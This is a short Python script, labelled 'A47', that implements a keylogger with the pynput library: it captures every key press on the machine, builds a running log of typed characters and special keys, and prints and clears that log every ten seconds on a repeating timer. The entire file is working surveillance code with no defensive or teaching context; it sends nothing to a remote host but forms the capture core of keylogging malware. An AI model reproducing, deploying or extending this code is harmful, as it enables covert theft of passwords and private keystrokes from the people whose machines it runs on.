#######
# A47 #
#######

import pynput.keyboard
import threading

class Keylogger:
    def __init__(self,t):
        self.log = "[+] K_Logger Started"
        self.interval_time = t

    def key_press(self,key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == key.space:
                self.log+=" "
            else:
                self.log+=" "+str(key)+" "

    def report(self):
        print(self.log)
        self.log = ""
        timer = threading.Timer(self.interval_time, self.report) 
        timer.start()

    def start(self):
        key_listener = pynput.keyboard.Listener(on_press=self.key_press)#call back function
        with key_listener:
            self.report()
            key_listener.join() # start the listener
            


A47 = Keylogger(10)
A47.start()